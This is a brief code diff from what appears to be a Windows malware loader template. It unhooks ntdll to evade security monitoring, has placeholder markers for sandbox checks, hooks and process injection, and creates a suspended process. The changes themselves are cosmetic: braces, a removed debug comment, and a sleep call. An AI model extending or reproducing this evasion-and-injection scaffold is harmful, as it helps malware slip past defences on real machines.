@@ -39,11 +39,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	// #-SANDBOX_CHECK_CALL-#
 	//printf("[+] Un-hooking Ntdll \n");
 	LPVOID nt = MapNtdll();
-	if (!nt) 
+	if (!nt) {
 		return -1;
+	}
 
-	if (!Unhook(nt)) 
+	if (!Unhook(nt)) {
 		return -1;
+	}
 
 	// Install hooks AFTER unhooking so they don't get erased
 	// #-TRAMPOLINE_CALL-#
@@ -72,9 +74,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		//printf("[-] Failed to create suspended process!\n");
 		return -1;
 	}
-	//printf("[+] Process created with PID: %d\n", dwProcessId);
 
-	JITTER_SLEEP(2500);
+	Sleep(2500);
 	// #-INJECTION_METHOD_PLACEHOLDER-#
 	
 	// Cleanup: Zero out sensitive data before freeing
